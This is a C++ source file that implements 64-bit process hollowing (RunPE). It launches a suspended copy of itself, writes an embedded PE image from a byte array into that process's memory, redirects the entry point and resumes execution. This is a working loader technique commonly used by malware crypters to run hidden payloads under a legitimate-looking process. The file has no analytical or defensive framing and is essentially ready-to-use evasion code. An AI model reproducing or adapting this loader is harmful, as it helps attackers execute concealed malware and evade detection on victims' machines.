#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <psapi.h>
#include "shitBytes.h"

int runPE64(LPPROCESS_INFORMATION lpPI, LPSTARTUPINFOW lpSI, LPVOID lpImage, LPWSTR wszArgs, SIZE_T szArgs) {
    if (lpImage == 0) {
        MessageBoxA(NULL, "Failed to download image", NULL, NULL);
        return -1;
    }

    WCHAR wszFilePath[MAX_PATH];
    GetModuleFileNameExW((HANDLE)-1, GetModuleHandle(NULL), wszFilePath, MAX_PATH);
    WCHAR wszArgsBuffer[MAX_PATH + 2048];
    ZeroMemory(wszArgsBuffer, sizeof wszArgsBuffer);
    SIZE_T length = wcslen(wszFilePath);
    memcpy(wszArgsBuffer, wszFilePath, length * sizeof(WCHAR));
    wszArgsBuffer[length] = ' ';
    memcpy(wszArgsBuffer + length + 1, wszArgs, szArgs);

    PIMAGE_DOS_HEADER lpDOSHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(lpImage);
    PIMAGE_NT_HEADERS lpNTHeader = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<DWORD64>(lpImage) + lpDOSHeader->e_lfanew);
    if (lpNTHeader->Signature != IMAGE_NT_SIGNATURE)
    {
        return -2;
    }

    if (!CreateProcessW(NULL, wszArgsBuffer, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, NULL, lpSI, lpPI))
    {
        return -3;
    }

    CONTEXT stCtx;
    ZeroMemory(&stCtx, sizeof stCtx);
    stCtx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(lpPI->hThread, &stCtx))
    {
        TerminateProcess(lpPI->hProcess, -4);
        return -4;
    }

    LPVOID lpImageBase = VirtualAllocEx(lpPI->hProcess, reinterpret_cast<LPVOID>(lpNTHeader->OptionalHeader.ImageBase), lpNTHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (lpImageBase == NULL)
    {
        TerminateProcess(lpPI->hProcess, -5);
        return -5;
    }

    if (!WriteProcessMemory(lpPI->hProcess, lpImageBase, lpImage, lpNTHeader->OptionalHeader.SizeOfHeaders, NULL))
    {
        TerminateProcess(lpPI->hProcess, -6);
        return -6;
    }

    for (SIZE_T iSection = 0; iSection < lpNTHeader->FileHeader.NumberOfSections; ++iSection)
    {
        PIMAGE_SECTION_HEADER stSectionHeader = reinterpret_cast<PIMAGE_SECTION_HEADER>(reinterpret_cast<DWORD64>(lpImage) + lpDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64) + sizeof(IMAGE_SECTION_HEADER) * iSection);

        if (!WriteProcessMemory(lpPI->hProcess, reinterpret_cast<LPVOID>(reinterpret_cast<DWORD64>(lpImageBase) + stSectionHeader->VirtualAddress), reinterpret_cast<LPVOID>(reinterpret_cast<DWORD64>(lpImage) + stSectionHeader->PointerToRawData), stSectionHeader->SizeOfRawData, NULL))
        {
            TerminateProcess(lpPI->hProcess, -7);
            return -7;
        }
    }

    if (!WriteProcessMemory(lpPI->hProcess, reinterpret_cast<LPVOID>(stCtx.Rdx + sizeof(LPVOID) * 2), &lpImageBase, sizeof(LPVOID), NULL))
    {
        TerminateProcess(lpPI->hProcess, -8);
        return -8;
    }

    stCtx.Rcx = reinterpret_cast<DWORD64>(lpImageBase) + lpNTHeader->OptionalHeader.AddressOfEntryPoint;
    if (!SetThreadContext(lpPI->hThread, &stCtx))
    {
        TerminateProcess(lpPI->hProcess, -9);
        return -9;
    }

    if (!ResumeThread(lpPI->hThread))
    {
        TerminateProcess(lpPI->hProcess, -10);
        return -10;
    }

    return 0;
}

int main()
{
    DWORD dwRet = 0;

    PROCESS_INFORMATION stPI;
    ZeroMemory(&stPI, sizeof stPI);
    STARTUPINFOW stSI;
    ZeroMemory(&stSI, sizeof stSI);
    WCHAR szArgs[] = L"";
    if (!runPE64(&stPI, &stSI, reinterpret_cast<LPVOID>(rawData), szArgs, sizeof szArgs)) {
        WaitForSingleObject(stPI.hProcess, INFINITE);

        GetExitCodeProcess(stPI.hProcess, &dwRet);

        CloseHandle(stPI.hThread);
        CloseHandle(stPI.hProcess);
    } 
}
